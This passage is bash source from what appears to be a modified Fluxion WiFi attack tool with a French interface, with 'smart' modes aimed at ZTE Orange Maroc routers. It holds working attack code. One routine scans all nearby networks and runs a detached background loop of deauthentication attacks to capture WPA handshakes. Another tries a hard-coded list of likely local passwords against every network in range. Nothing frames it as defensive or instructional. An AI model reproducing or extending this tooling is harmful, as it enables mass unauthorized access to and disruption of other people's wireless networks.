  # Use the selected interface directly if it exists, otherwise lookup in hash
  if interface_is_real "$selectedInterface"; then
    echo "interface_is_real returned true, using direct" >> $FLUXIONOutputDevice
    FluxionTargetTrackerInterface="$selectedInterface"
  else
    echo "interface_is_real returned false, using hash lookup" >> $FLUXIONOutputDevice
    FluxionTargetTrackerInterface=${FluxionInterfaces[$selectedInterface]}
  fi
  echo "Final FluxionTargetTrackerInterface='$FluxionTargetTrackerInterface'" >> $FLUXIONOutputDevice
}

fluxion_target_unset() {
  FluxionTargetMAC=""
  FluxionTargetSSID=""
  FluxionTargetChannel=""

  FluxionTargetEncryption=""

  FluxionTargetMakerID=""
  FluxionTargetMaker=""

  FluxionTargetSSIDClean=""

  FluxionTargetRogueMAC=""

  return 1 # To trigger undo-chain.
}

fluxion_target_set() {
  echo ">>> fluxion_target_set called" >> "$FLUXIONOutputDevice"
  # Check if attack is targetted & set the attack target if so.
  if ! type -t attack_targetting_interfaces &> /dev/null; then
    echo ">>> attack_targetting_interfaces not found" >> "$FLUXIONOutputDevice"
    return 1
  fi
  echo ">>> attack_targetting_interfaces found" >> "$FLUXIONOutputDevice"

  if [ \
    "$FluxionTargetSSID" -a \
    "$FluxionTargetMAC" -a \
    "$FluxionTargetChannel" \
  ]; then
    # Auto-confirm target in smart/auto mode
    if [ "$FLUXIONSmartMode" ] || [ "$FLUXIONAutoCapture" ] || [ "$FLUXIONAuto" ]; then
      echo "Auto mode: using existing target" > $FLUXIONOutputDevice
      return 0
    fi
    
    # If we've got a candidate target, ask user if we'll keep targetting it.
    fluxion_header
    fluxion_target_show
    echo
    echo -e  "$FLUXIONVLine $FLUXIONTargettingAccessPointAboveNotice"

    # TODO: This doesn't translate choices to the selected language.
    while ! echo "$choice" | grep -q "^[ynYN]$" &> /dev/null; do
      echo -ne "$FLUXIONVLine $FLUXIONContinueWithTargetQuery [Y/n] "
      local choice
      read choice
      if [ ! "$choice" ]; then break; fi
    done

    echo -ne "\n\n"

    if [ "${choice,,}" != "n" ]; then
      return 0
    fi
  elif [ \
    "$FluxionTargetSSID" -o \
    "$FluxionTargetMAC" -o \
    "$FluxionTargetChannel" \
  ]; then
    # TODO: Survey environment here to autofill missing fields.
    # In other words, if a user gives incomplete information, scan
    # the environment based on either the ESSID or BSSID, & autofill.
    echo -e "$FLUXIONVLine $FLUXIONIncompleteTargettingInfoNotice"
    sleep 3
  fi

  echo "Starting fluxion_get_interface for targetting" >> $FLUXIONOutputDevice
  if ! fluxion_get_interface attack_targetting_interfaces \
    "$FLUXIONTargetSearchingInterfaceQuery"; then
    echo "fluxion_get_interface failed for targetting" >> $FLUXIONOutputDevice
    return 2
  fi
  if ! fluxion_allocate_interface $FluxionInterfaceSelected; then
    return 3
  fi

  # Use the selected interface directly if it exists, otherwise lookup in hash
  local targetInterface
  if interface_is_real "$FluxionInterfaceSelected"; then
    targetInterface="$FluxionInterfaceSelected"
  else
    targetInterface="${FluxionInterfaces[$FluxionInterfaceSelected]}"
  fi

  if ! fluxion_get_target "$targetInterface"; then
    return 4
  fi
}


# =================== < Hash Subroutines > =================== #
# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
fluxion_hash_verify() {
  if [ ${#@} -lt 3 ]; then return 1; fi

  local hashPath=$1

  # If no valid default path was passed, try to locate a handshake by BSSID.
  if [ ! "$hashPath" -o ! -s "$hashPath" ]; then
    local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
    if [ -d "$handshakeDir" ]; then
      local -r bssid_search="${2:-$FluxionTargetMAC}"
      local found_hash
      found_hash=$(ls "$handshakeDir"/*"${bssid_search^^}".cap 2>/dev/null | head -n1)
      if [ ! "$found_hash" ]; then
        found_hash=$(ls "$handshakeDir"/*"${bssid_search,,}".cap 2>/dev/null | head -n1)
      fi
      if [ "$found_hash" ]; then
        hashPath="$found_hash"
      fi
    fi
  fi
  local -r hashBSSID=$2
  local -r hashESSID=$3
  local -r hashChannel=$4
  local -r hashEncryption=$5
  local -r hashMaker=$6

  if [ ! -f "$hashPath" -o ! -s "$hashPath" ]; then
    echo -e "$FLUXIONVLine $FLUXIONHashFileDoesNotExistError"
    sleep 3
    return 2
  fi

  if [ "$FLUXIONAuto" ]; then
    local -r verifier="cowpatty"
  else
    fluxion_header

    echo -e "$FLUXIONVLine $FLUXIONHashVerificationMethodQuery"
    echo

    fluxion_target_show

    local choices=( \
      "$FLUXIONHashVerificationMethodAircrackOption" \
      "$FLUXIONHashVerificationMethodCowpattyOption" \
    )

    # Add pyrit to the options is available.
    if [ -x "$(command -v pyrit)" ]; then
      choices+=("$FLUXIONHashVerificationMethodPyritOption")
    fi

    options+=("$FLUXIONGeneralBackOption")

    io_query_choice "" choices[@]

    echo

    case "$IOQueryChoice" in
      "$FLUXIONHashVerificationMethodPyritOption")
        local -r verifier="pyrit" ;;

      "$FLUXIONHashVerificationMethodAircrackOption")
        local -r verifier="aircrack-ng" ;;

      "$FLUXIONHashVerificationMethodCowpattyOption")
        local -r verifier="cowpatty" ;;

      "$FLUXIONGeneralBackOption")
        return -1 ;;
    esac
  fi

  hash_check_handshake \
    "$verifier" \
    "$hashPath" \
    "$hashESSID" \
    "$hashBSSID"

  local -r hashResult=$?

  # A value other than 0 means there's an issue with the hash.
  if [ $hashResult -ne 0 ]; then
    echo -e "$FLUXIONVLine $FLUXIONHashInvalidError"
  else
    echo -e "$FLUXIONVLine $FLUXIONHashValidNotice"
  fi

  sleep 3

  if [ $hashResult -ne 0 ]; then return 1; fi
}

fluxion_hash_unset_path() {
  if [ ! "$FluxionHashPath" ]; then return 1; fi
  FluxionHashPath=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$FLUXIONAuto" ]; then return 2; fi
}

# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
fluxion_hash_set_path() {
  if [ "$FluxionHashPath" ]; then return 0; fi

  fluxion_hash_unset_path

  local -r hashPath=$1

  # If we've got a default path, check if a hash exists.
  # If one exists, ask users if they'd like to use it.
  if [ "$hashPath" -a -f "$hashPath" -a -s "$hashPath" ]; then
    if [ "$FLUXIONAuto" ]; then
      echo "Using default hash path: $hashPath" > $FLUXIONOutputDevice
      FluxionHashPath=$hashPath
      return
    else
      local choices=( \
        "$FLUXIONUseFoundHashOption" \
        "$FLUXIONSpecifyHashPathOption" \
        "$FLUXIONHashSourceRescanOption" \
        "$FLUXIONGeneralBackOption" \
      )

      fluxion_header

      echo -e "$FLUXIONVLine $FLUXIONFoundHashNotice"
      echo -e "$FLUXIONVLine $FLUXIONUseFoundHashQuery"
      echo

      io_query_choice "" choices[@]

      echo

      case "$IOQueryChoice" in
        "$FLUXIONUseFoundHashOption")
          FluxionHashPath=$hashPath
          return ;;

        "$FLUXIONHashSourceRescanOption")
          fluxion_hash_set_path "$@"
          return $? ;;

        "$FLUXIONGeneralBackOption")
          return -1 ;;
      esac
    fi
  fi

  while [ ! "$FluxionHashPath" ]; do
    fluxion_header

    echo
    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileQuery"
    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileReturnTip"
    echo
    echo -ne "$FLUXIONAbsolutePathInfo: "
    read -e FluxionHashPath

    # Back-track when the user leaves the hash path blank.
    # Notice: Path is cleared if we return, no need to unset.
    if [ ! "$FluxionHashPath" ]; then return 1; fi

    echo "Path given: \"$FluxionHashPath\"" > $FLUXIONOutputDevice

    # Make sure the path points to a valid generic file.
    if [ ! -f "$FluxionHashPath" -o ! -s "$FluxionHashPath" ]; then
      echo -e "$FLUXIONVLine $FLUXIONEmptyOrNonExistentHashError"
      sleep 5
      fluxion_hash_unset_path
    fi
  done
}

# Paramters: <defaultHashPath> <bssid> <essid>
fluxion_hash_get_path() {
  # Assure we've got the bssid and the essid passed in.
  if [ ${#@} -lt 2 ]; then return 1; fi

  while true; do
    fluxion_hash_unset_path
    fluxion_hash_set_path "$@"
    local hash_set_result=$?

    # Handle user navigation separately from real errors.
    if [ $hash_set_result -ne 0 ]; then
      # 1  -> user hit enter on an empty path; keep looping so any
      #       previously found/default hash can be offered again.
      #       BUT if no valid default hash exists, allow going back.
      # 255-> user selected the explicit Back option; bubble up.
      if [ $hash_set_result -eq 1 ]; then
        # Only continue looping if a valid default hash file exists
        if [ -n "$1" ] && [ -f "$1" ] && [ -s "$1" ]; then
          continue  # Valid default hash exists, loop to offer it again
        else
          return -1  # No valid default hash, allow user to go back
        fi
      fi

      if [ $hash_set_result -eq 255 ]; then
        return -1
      fi

      echo "Failed to set hash path." > $FLUXIONOutputDevice
      return -1 # WARNING: The recent error code is NOT contained in $? here!
    else
      echo "Hash path: \"$FluxionHashPath\"" > $FLUXIONOutputDevice
    fi

    if fluxion_hash_verify "$FluxionHashPath" "$2" "$3"; then
      break;
    fi
  done

  # At this point FluxionHashPath will be set and ready.
}


# ================== < Attack Subroutines > ================== #
fluxion_unset_attack() {
  local -r attackWasSet=${FluxionAttack:+1}
  FluxionAttack=""
  if [ ! "$attackWasSet" ]; then return 1; fi
}

fluxion_set_attack() {
  if [ "$FluxionAttack" ]; then return 0; fi

  fluxion_unset_attack

  fluxion_header

  echo -e "$FLUXIONVLine $FLUXIONAttackQuery"
  echo

  fluxion_target_show

  # Smart options first
  local smartOptions=(
    "SMART_ZTE"
    "AUTO_CAPTURE_ALL"
    "LIVE_TEST_ALL"
    "SMART_CAPTURE"
    "SMART_BRUTEFORCE"
    "MANUAL_BRUTEFORCE"
    "CHANGE_TARGET"
  )
  local smartIdentifiers=(
    "🚀 SMART - Tout Auto (ZTE Orange Maroc)"
    "📡 AUTO CAPTURE TOUT - Scan + Capture auto"
    "🔴 TEST LIVE - Scan + Test passwords SANS handshake"
    "📡 Capture Handshake (cible unique)"
    "🔓 Smart Bruteforce (choisir handshake)"
    "⚙️  Bruteforce Manuel (config perso)"
    "🔄 Changer de cible WiFi"
  )
  local smartDescriptions=(
    "Scan → Capture → Bruteforce ZTE patterns"
    "Scanne et capture TOUS les réseaux automatiquement"
    "Scanne et teste les mots de passe en connexion directe"
    "Capture automatique sans bruteforce"
    "Bruteforce ZTE sur handshake existant"
    "Définir charset et longueur manuellement"
    "Rescan et choisir une nouvelle cible"
  )

  # Get regular attacks
  local attacks
  readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")

  local descriptions
  readarray -t descriptions < <(
    head -n 3 "$FLUXIONPath/attacks/"*"/language/$FluxionLanguage.sh" 2>/dev/null | \
    grep -E "^# description: " | sed -E 's/# \w+: //'
  )

  local identifiers=()
  local attack
  for attack in "${attacks[@]}"; do
    local identifier=$(
      head -n 3 "$FLUXIONPath/attacks/$attack/language/$FluxionLanguage.sh" 2>/dev/null | \
      grep -E "^# identifier: " | sed -E 's/# \w+: //'
    )
    if [ "$identifier" ]; then
      identifiers+=("$identifier")
    else
      identifiers+=("$attack")
    fi
  done

  # Combine: Smart + Regular + Back
  local allOptions=("${smartOptions[@]}" "${attacks[@]}" "$FLUXIONGeneralBackOption")
  local allIdentifiers=("${smartIdentifiers[@]}" "${identifiers[@]}" "$FLUXIONGeneralBackOption")
  local allDescriptions=("${smartDescriptions[@]}" "${descriptions[@]}" "")

  echo -e "  ${CGrn}━━━━━━━━━━ MODES INTELLIGENTS ━━━━━━━━━━${CClr}"
  io_query_format_fields "" \
    "\t$CRed[$CSYel%d$CClr$CRed]$CClr%0.0s $CCyn%b$CClr %b\n" \
    allOptions[@] allIdentifiers[@] allDescriptions[@]

  echo

  case "${IOQueryFormatFields[0]}" in
    "SMART_ZTE")
      # Enable full smart mode
      FLUXIONSmartMode=1
      FLUXIONAutoCapture=1
      FLUXIONAutoBruteforce=1
      FluxionAttack="Handshake Snooper"
      echo "SMART MODE: Capture → Bruteforce ZTE" >> "$FLUXIONOutputDevice"
      ;;
    "AUTO_CAPTURE_ALL")
      # Full auto capture all networks
      fluxion_auto_capture_all
      return 0
      ;;
    "LIVE_TEST_ALL")
      # Live password test on multiple networks - no handshake needed
      fluxion_live_test_all
      return 0
      ;;
    "SMART_CAPTURE")
      # Auto capture only
      FLUXIONAutoCapture=1
      FluxionAttack="Handshake Snooper"
      echo "AUTO CAPTURE MODE" >> "$FLUXIONOutputDevice"
      ;;
    "SMART_BRUTEFORCE")
      # Direct bruteforce with handshake picker - bypasses normal flow
      fluxion_direct_bruteforce
      return 0  # Return after direct execution
      ;;
    "MANUAL_BRUTEFORCE")
      # Manual bruteforce - no auto flags
      FluxionAttack="Bruteforce"
      echo "MANUAL BRUTEFORCE MODE" >> "$FLUXIONOutputDevice"
      ;;
    "CHANGE_TARGET")
      # Reset target and rescan
      FluxionTargetMAC=""
      FluxionTargetSSID=""
      FluxionTargetChannel=""
      FluxionTargetSSIDClean=""
      FluxionInterfaceSelected=""
      source "$FLUXIONLibPath/ColorUtils.sh"
      echo -e "${CGrn}Cible réinitialisée. Rescannez les réseaux.${CClr}"
      sleep 1
      return 1  # Return to trigger rescan
      ;;
    "$FLUXIONGeneralBackOption")
      return -1
      ;;
    *)
      FluxionAttack=${IOQueryFormatFields[0]}
      ;;
  esac

  echo "Selected attack: $FluxionAttack" >> "$FLUXIONOutputDevice"
  return 0
}

# ============================================================ #
# =============== < Smart Handshake Picker > ================= #
# ============================================================ #
fluxion_smart_handshake_picker() {
  local handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  
  if [ ! -d "$handshakeDir" ]; then
    echo -e "$FLUXIONVLine ${CRed}Aucun dossier de handshakes trouvé!${CClr}"
    echo -e "$FLUXIONVLine Utilisez d'abord 'Auto Capture Handshake'"
    sleep 3
    return 1
  fi
  
  local handshakes
  readarray -t handshakes < <(ls -1 "$handshakeDir"/*.cap 2>/dev/null)
  
  if [ ${#handshakes[@]} -eq 0 ]; then
    echo -e "$FLUXIONVLine ${CRed}Aucun handshake trouvé!${CClr}"
    echo -e "$FLUXIONVLine Utilisez d'abord 'Auto Capture Handshake'"
    sleep 3
    return 1
  fi
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}Sélectionner un handshake:${CClr}"
  echo
  
  local displayNames=()
  local i=1
  for hs in "${handshakes[@]}"; do
    local basename=$(basename "$hs" .cap)
    local size=$(du -h "$hs" 2>/dev/null | cut -f1)
    local date=$(stat -c %y "$hs" 2>/dev/null | cut -d' ' -f1)
    displayNames+=("$basename ($size - $date)")
    echo -e "\t$CRed[$CSYel$i$CClr$CRed]$CClr $CCyn$basename$CClr ($size - $date)"
    ((i++))
  done
  
  displayNames+=("$FLUXIONGeneralBackOption")
  echo -e "\t$CRed[$CSYel$i$CClr$CRed]$CClr $FLUXIONGeneralBackOption"
  
  echo
  echo -ne "$FLUXIONPrompt"
  read selection
  
  # Validate selection
  if ! [[ "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt $i ]; then
    echo -e "${CRed}Sélection invalide${CClr}"
    sleep 2
    return 1
  fi
  
  if [ "$selection" -eq $i ]; then
    return 1  # Back option
  fi
  
  # Set selected handshake
  local selectedIndex=$((selection - 1))
  FluxionSelectedHandshake="${handshakes[$selectedIndex]}"
  
  # Extract target info from filename (format: SSID-MAC.cap)
  local basename=$(basename "$FluxionSelectedHandshake" .cap)
  FluxionTargetMAC=$(echo "$basename" | grep -oE '[0-9A-Fa-f:]{17}$' | head -1)
  FluxionTargetSSID=$(echo "$basename" | sed "s/-${FluxionTargetMAC}//")
  FluxionTargetSSIDClean=$(echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g')
  
  echo -e "$FLUXIONVLine ${CGrn}Handshake sélectionné:${CClr} $basename"
  sleep 1
  
  return 0
}

# ============================================================ #
# ============= < Auto Capture All Networks > ================ #
# ============================================================ #
fluxion_auto_capture_all() {
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}=== AUTO CAPTURE TOUT ===${CClr}"
  echo -e "$FLUXIONVLine Scanne tous les réseaux et capture automatiquement"
  echo
  
  # Get wireless interface
  interface_list_wireless
  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
    echo -e "${CRed}Aucune interface wireless trouvée!${CClr}"
    sleep 3
    return 1
  fi
  
  local captureInterface="${InterfaceListWireless[0]}"
  echo -e "$FLUXIONVLine Interface: ${CCyn}$captureInterface${CClr}"
  
  # Put interface in monitor mode
  echo -e "$FLUXIONVLine Activation mode monitor..."
  airmon-ng start "$captureInterface" &> /dev/null
  local monInterface="${captureInterface}mon"
  [ ! -d "/sys/class/net/$monInterface" ] && monInterface="$captureInterface"
  
  # Scan for networks
  local scanFile="/tmp/fluxion_scan_$$"
  local scanDuration=15
  
  echo -e "$FLUXIONVLine ${CYel}Scan des réseaux ($scanDuration sec)...${CClr}"
  echo
  
  # Launch airodump-ng scan
  timeout $scanDuration airodump-ng --write "$scanFile" --output-format csv "$monInterface" &> /dev/null &
  local scanPID=$!
  
  # Show spinner
  local spin='-\|/'
  local i=0
  while kill -0 $scanPID 2>/dev/null; do
    i=$(( (i+1) %4 ))
    printf "\r$FLUXIONVLine Scan en cours... ${spin:$i:1}"
    sleep 0.3
  done
  printf "\r"
  
  # Parse results
  local csvFile="${scanFile}-01.csv"
  if [ ! -f "$csvFile" ]; then
    echo -e "${CRed}Erreur: fichier scan non trouvé${CClr}"
    airmon-ng stop "$monInterface" &> /dev/null
    return 1
  fi
  
  # Load already cracked passwords to skip
  local crackedFile="$FLUXIONPath/attacks/Bruteforce/cracked/passwords.csv"
  local crackedMACs=()
  if [ -f "$crackedFile" ]; then
    while IFS=',' read -r date ssid mac pass; do
      crackedMACs+=("$mac")
    done < "$crackedFile"
  fi
  
  # Also load already captured handshakes
  local handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  local capturedMACs=()
  if [ -d "$handshakeDir" ]; then
    shopt -s nullglob
    for hsFile in "$handshakeDir"/*.cap; do
      [ -f "$hsFile" ] || continue
      local hsMac=$(basename "$hsFile" .cap | grep -oE '[0-9A-Fa-f:]{17}$' | head -1)
      [ "$hsMac" ] && capturedMACs+=("$hsMac")
    done
    shopt -u nullglob
  fi
  
  # Extract networks with signal strength > -80 dB
  local networks=()
  local networkMACs=()
  local networkChannels=()
  local seenBaseNames=()  # To detect band duplicates
  
  while IFS=',' read -r bssid firstSeen lastSeen channel speed privacy cipher auth power beacons iv lanIP idLen essid key; do
    # Skip header and empty lines
    [[ "$bssid" == *"BSSID"* ]] && continue
    [[ -z "$bssid" ]] && continue
    [[ "$bssid" == *"Station"* ]] && break
    
    # Clean values
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//' | sed 's/ *$//')
    
    # Skip if no ESSID or weak signal
    [[ -z "$essid" ]] && continue
    [[ "$power" == "-1" ]] && continue
    [[ "$power" -lt -80 ]] 2>/dev/null && continue
    
    # Skip already cracked networks
    local isCracked=0
    for crackedMac in "${crackedMACs[@]}"; do
      if [[ "${bssid^^}" == "${crackedMac^^}" ]]; then
        isCracked=1
        echo -e "$FLUXIONVLine ${CYel}Skip (déjà cracké):${CClr} $essid" >> /dev/stderr
        break
      fi
    done
    [ $isCracked -eq 1 ] && continue
    
    # Skip already captured handshakes
    local isCaptured=0
    for capMac in "${capturedMACs[@]}"; do
      if [[ "${bssid^^}" == "${capMac^^}" ]]; then
        isCaptured=1
        echo -e "$FLUXIONVLine ${CYel}Skip (handshake existe):${CClr} $essid" >> /dev/stderr
        break
      fi
    done
    [ $isCaptured -eq 1 ] && continue
    
    # Extract base name to detect band duplicates (_5G, _2.4G, _PLUS, -5G, -2.4G)
    local baseName=$(echo "$essid" | sed -E 's/[_-]?(5G|2\.4G|2G|PLUS|5GHz|2\.4GHz)$//i')
    
    # Check if we already have this base network
    local isDuplicate=0
    for seenBase in "${seenBaseNames[@]}"; do
      if [[ "${baseName,,}" == "${seenBase,,}" ]]; then
        isDuplicate=1
        echo -e "$FLUXIONVLine ${CYel}Skip (bande dupliquée):${CClr} $essid" >> /dev/stderr
        break
      fi
    done
    [ $isDuplicate -eq 1 ] && continue
    
    seenBaseNames+=("$baseName")
    networks+=("$essid")
    networkMACs+=("$bssid")
    networkChannels+=("$channel")
    
  done < "$csvFile"
  
  rm -f "${scanFile}"* 2>/dev/null
  
  if [ ${#networks[@]} -eq 0 ]; then
    echo -e "${CRed}Aucun réseau trouvé avec signal suffisant${CClr}"
    airmon-ng stop "$monInterface" &> /dev/null
    sleep 2
    return 1
  fi
  
  echo -e "$FLUXIONVLine ${CGrn}${#networks[@]} réseaux trouvés${CClr}"
  echo
  
  for i in "${!networks[@]}"; do
    echo -e "  ${CCyn}[$((i+1))]${CClr} ${networks[$i]} (${networkMACs[$i]}) CH:${networkChannels[$i]}"
  done
  
  echo
  echo -e "$FLUXIONVLine ${CYel}Lancement capture automatique en arrière-plan...${CClr}"
  echo
  
  # Create capture script
  local captureScript="/tmp/fluxion_auto_capture_$$.sh"
  local handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  mkdir -p "$handshakeDir"
  
  cat > "$captureScript" << 'CAPTURE_SCRIPT'
#!/bin/bash
INTERFACE="$1"
HANDSHAKE_DIR="$2"
shift 2

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║      FLUXION AUTO CAPTURE - Mode Continu         ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""

NETWORKS=()
while [ "$1" ]; do
  NETWORKS+=("$1")
  shift
done

CAPTURED=0
TOTAL=$((${#NETWORKS[@]} / 3))

for ((i=0; i<${#NETWORKS[@]}; i+=3)); do
  SSID="${NETWORKS[$i]}"
  MAC="${NETWORKS[$i+1]}"
  CHANNEL="${NETWORKS[$i+2]}"
  
  CURRENT=$(((i/3)+1))
  
  echo ""
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${CYAN}[$CURRENT/$TOTAL] Capture: $SSID${NC}"
  echo -e "${CYAN}MAC: $MAC | Channel: $CHANNEL${NC}"
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  
  CAPTURE_FILE="/tmp/capture_${CURRENT}"
  HANDSHAKE_FILE="$HANDSHAKE_DIR/${SSID}-${MAC}.cap"
  
  # Check if already captured
  if [ -f "$HANDSHAKE_FILE" ]; then
    echo -e "${YELLOW}Handshake déjà existant, skip...${NC}"
    continue
  fi
  
  # Set channel
  iwconfig "$INTERFACE" channel "$CHANNEL" 2>/dev/null
  
  # Start capture
  airodump-ng -c "$CHANNEL" --bssid "$MAC" -w "$CAPTURE_FILE" "$INTERFACE" &> /dev/null &
  CAPTURE_PID=$!
  
  # Deauth to force handshake
  sleep 2
  echo -e "${YELLOW}Deauth en cours...${NC}"
  
  for j in {1..5}; do
    aireplay-ng -0 2 -a "$MAC" "$INTERFACE" &> /dev/null
    sleep 3
    
    # Check for handshake
    if [ -f "${CAPTURE_FILE}-01.cap" ]; then
      if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
        echo -e "${GREEN}✓ Handshake capturé!${NC}"
        cp "${CAPTURE_FILE}-01.cap" "$HANDSHAKE_FILE"
        ((CAPTURED++))
        break
      fi
    fi
  done
  
  kill $CAPTURE_PID 2>/dev/null
  rm -f "${CAPTURE_FILE}"* 2>/dev/null
  
  if [ ! -f "$HANDSHAKE_FILE" ]; then
    echo -e "${RED}✗ Pas de handshake (pas de clients?)${NC}"
  fi
done

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              CAPTURE TERMINÉE                    ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║  Réseaux scannés: $TOTAL${NC}"
echo -e "${GREEN}║  Handshakes capturés: $CAPTURED${NC}"
echo -e "${GREEN}║  Dossier: $HANDSHAKE_DIR${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""
read -p "Appuyez sur Entrée pour fermer..."
CAPTURE_SCRIPT

  chmod +x "$captureScript"
  
  # Build network args
  local networkArgs=""
  for i in "${!networks[@]}"; do
    networkArgs+=" '${networks[$i]}' '${networkMACs[$i]}' '${networkChannels[$i]}'"
  done
  
  # Create wrapper for true independence
  local wrapperFile="/tmp/fluxion_capture_wrapper_$$.sh"
  cat > "$wrapperFile" << WRAPPER
#!/bin/bash
trap '' HUP INT TERM
cd /tmp
exec bash '$captureScript' '$monInterface' '$handshakeDir' $networkArgs
WRAPPER
  chmod +x "$wrapperFile"
  
  # Try screen first, then tmux, then xterm
  if command -v screen &>/dev/null; then
    screen -dmS "fluxion_capture_$$" bash -c "bash '$wrapperFile'; exec bash"
    echo -e "${CGrn}✓ Capture lancée dans screen: fluxion_capture_$$${CClr}"
    echo -e "${CYel}  Pour voir: screen -r fluxion_capture_$$${CClr}"
  elif command -v tmux &>/dev/null; then
    tmux new-session -d -s "fluxion_capture_$$" "bash '$wrapperFile'; read"
    echo -e "${CGrn}✓ Capture lancée dans tmux: fluxion_capture_$$${CClr}"
    echo -e "${CYel}  Pour voir: tmux attach -t fluxion_capture_$$${CClr}"
  else
    ( setsid nohup xterm -hold -bg "#1a1a2e" -fg "#00ff00" -T "Fluxion Auto Capture" \
      -e "bash '$wrapperFile'" </dev/null >/dev/null 2>&1 & )
    echo -e "${CGrn}✓ Capture lancée en xterm détaché${CClr}"
  fi
  
  disown -a 2>/dev/null
  
  echo -e "${CYel}  Vous pouvez continuer à utiliser Fluxion.${CClr}"
  echo ""
  echo -e "$FLUXIONVLine Appuyez sur Entrée pour revenir au menu..."
  read
}

# ============================================================ #
# ========== < Live Test All Networks (No Handshake) > ======= #
# ============================================================ #
fluxion_live_test_all() {
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CRed}=== TEST LIVE MULTI-RÉSEAUX ===${CClr}"
  echo -e "$FLUXIONVLine ${CYel}Scanne et teste les mots de passe SANS handshake${CClr}"
  echo
  
  # List available interfaces for user to choose
  interface_list_wireless
  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
    echo -e "${CRed}Aucune interface WiFi trouvée!${CClr}"
    sleep 2
    return 1
  fi
  
  echo -e "$FLUXIONVLine ${CYel}Choisir l'interface WiFi:${CClr}"
  local i=1
  for iface in "${InterfaceListWireless[@]}"; do
    echo -e "\t${CRed}[${CSYel}$i${CClr}${CRed}]${CClr} $iface"
    ((i++))
  done
  echo
  echo -ne "$FLUXIONPrompt"
  read ifaceChoice
  
  if [ -z "$ifaceChoice" ] || [ "$ifaceChoice" -lt 1 ] || [ "$ifaceChoice" -gt ${#InterfaceListWireless[@]} ]; then
    ifaceChoice=1
  fi
  
  local wifiInterface="${InterfaceListWireless[$((ifaceChoice-1))]}"
  echo -e "$FLUXIONVLine Interface sélectionnée: ${CCyn}$wifiInterface${CClr}"
  
  # Stop monitor mode and set managed mode
  airmon-ng stop "${wifiInterface}mon" &>/dev/null
  ip link set "$wifiInterface" down 2>/dev/null
  iw dev "$wifiInterface" set type managed 2>/dev/null
  ip link set "$wifiInterface" up 2>/dev/null
  sleep 1
  
  # Scan for networks
  echo
  echo -e "$FLUXIONVLine ${CYel}Scan des réseaux (10 sec)...${CClr}"
  
  local scanFile="/tmp/live_scan_$$"
  timeout 10 iw dev "$wifiInterface" scan 2>/dev/null | grep -E "SSID:|BSS |signal:" > "$scanFile"
  
  # Parse networks
  local networks=()
  local currentSSID=""
  local currentBSS=""
  
  while read -r line; do
    if [[ "$line" =~ ^BSS ]]; then
      currentBSS=$(echo "$line" | grep -oE '[0-9a-f:]{17}')
    elif [[ "$line" =~ SSID: ]]; then
      currentSSID=$(echo "$line" | sed 's/.*SSID: //' | tr -d '\t')
      if [ -n "$currentSSID" ] && [ "$currentSSID" != "" ]; then
        networks+=("$currentSSID|$currentBSS")
      fi
    fi
  done < "$scanFile"
  rm -f "$scanFile"
  
  if [ ${#networks[@]} -eq 0 ]; then
    echo -e "${CRed}Aucun réseau trouvé!${CClr}"
    sleep 2
    return 1
  fi
  
  echo -e "$FLUXIONVLine ${CGrn}${#networks[@]} réseaux trouvés${CClr}"
  echo
  
  # Top passwords to test
  local passwords=(
    "2025@2026" "2026@2025" "2025@2025" "2026@2026"
    "2024@2025" "2025@2024" "2024@2024" "2027@2027"
    "20252026" "20262025" "20252025" "20262026"
    "Maroc2025" "Maroc2026" "maroc2025" "maroc2026"
    "wifi2025" "wifi2026" "password2025" "password2026"
    "12345678" "00000000" "11111111" "87654321"
    "orange2025" "orange2026" "admin2025" "admin2026"
  )
  
  local crackedDir="$FLUXIONPath/attacks/Bruteforce/cracked"
  mkdir -p "$crackedDir"
  
  local foundCount=0
  
  for netInfo in "${networks[@]}"; do
    local ssid="${netInfo%|*}"
    local bssid="${netInfo#*|}"
    
    echo
    echo -e "$FLUXIONVLine ${CCyn}━━━ Testing: $ssid ━━━${CClr}"
    
    for pwd in "${passwords[@]}"; do
      echo -ne "\r  Test: $pwd                         "
      
      # Create wpa_supplicant config
      local wpaConf="/tmp/wpa_live_$$.conf"
      cat > "$wpaConf" << EOF
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="$ssid"
    psk="$pwd"
    key_mgmt=WPA-PSK
    scan_ssid=1
}
EOF
      
      # Kill existing processes
      killall wpa_supplicant dhclient 2>/dev/null
